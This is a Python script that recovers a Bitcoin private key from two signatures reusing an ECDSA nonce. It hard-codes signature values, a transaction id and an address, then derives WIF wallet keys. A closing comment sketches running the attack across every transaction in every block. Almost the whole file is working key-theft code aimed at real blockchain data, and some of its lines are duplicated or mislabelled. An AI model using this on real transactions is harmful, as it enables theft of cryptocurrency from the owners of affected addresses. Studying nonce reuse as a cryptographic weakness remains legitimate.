""" Calculate btc private key if nonce is reused in a transaction
    Solving curve: y^2 = x^3 + 7
"""
from datetime import datetime
from itertools import count
import gmpy2
import multiprocessing
import bitcoin
from mnemonic import Mnemonic


# gmpy2.mpz( )
#G = bitcoin.getG()
n = 115792089237316195423570985008687907852837564279074904382605163141518161494337  # n = order(G)
p = 2**256 - 2**32 - 2**9 - 2**8 - 2**7 - 2**6 - 2**4 - 1


# transaction = 89380c9fb072cbb5af43428788edfd000f2c9c0e1f8649e436d255270e331b02
# btc_address_compressed = 1FaapwdwYVVBiV6Qvkis88c2KHPoxX1Jb1
# public_key_compressed = 03feddba8913001955d90ec1ec6ba040ca1c49aac063a9fc2bcec9cc87cd4ade99
##pkscript = 912986369574961717587753194721226289459268200534
k = ...  # nonce (hidden), 1 <= k <= 2^127
r = int("0f13c7c741321a95510ba98792bc9050efdce2e422be4610f162449adce92a47", 16)  # r = proj_x(k * G)

'''
in PUSHDATA(71)[30 44 02 20 0f13c7c741321a95510ba98792bc9050efdce2e422be4610f162449adce92a47 02 20 0b4cc3447a2793c4598e5829827f38c67f72e4c3d4688019cd94066b9e7df6b9 01]
PUSHDATA(33)[03feddba8913001955d90ec1ec6ba040ca1c49aac063a9fc2bcec9cc87cd4ade99]
outpoint: 783b79688de9465d0406cd69d41925981aec5fa938784c7bb45195e5ed7c6dce: 0
'''
m1 = int(bitcoin.sha256('message'), 16)  # sha254(m)
m1 = 31133511789966193434473156682648022965280901634950536313584626906865295404159
s1 = int("0b4cc3447a2793c4598e5829827f38c67f72e4c3d4688019cd94066b9e7df6b9", 16)  # s = k^−1 * (sha254(m) + r * private_key)

m2 = 108808786585075507407446857551522706228868950080801424952567576192808212665067
s2 = int("0ab06bc2befd52cde3b2de709a642e437b8a7187cc28de72bd5aff4a896e047b", 16)  # s6

#m0 =
#s0 = int("68cda3633583b3bb70c59b0d7f58d22129f5d5a82d995d00bb81ea2d0dd28aa2", 16)


k = pow(s1-s2, n-2, n) * (m1 - m2) % n  # nonce: 48312347265862616126700921953484308906418582139089607535555575183056232864549
private_key = pow(r, n-2, n) * (s1 * k - m1) % n
private_key = pow(r*(s1-s2), n-2, n) * (m1 * s2 - m2 * s1) % n  # gmpy2.powmod( ), used for inverse in modulo
#private_key = 35027840177330064405683178523079910253772859809146826320797401203281604260438

private_key = format(private_key, 'x')  # hex
wallet = bitcoin.encode_privkey(private_key, 'wif')  # base58('80' + private_key + checksum)
wallet_compressed = bitcoin.encode_privkey(private_key, 'wif_compressed')  # base58('80' + private_key + '01' + checksum)
public_key = bitcoin.privtopub(private_key)  # ECDSA cryptography: pub = priv × G
public_key_compressed = bitcoin.compress(public_key)
btc_address = bitcoin.pubtoaddr(public_key)  # base58('00' + ripemd160(sha256(public_key)) + checksum)
btc_address_compressed = bitcoin.pubtoaddr(public_key_compressed)  # base58('00' + ripemd160(sha256(public_key)) + checksum)





"""
for block in blocks:
    for transaction in block:
        attack(transaction)
"""
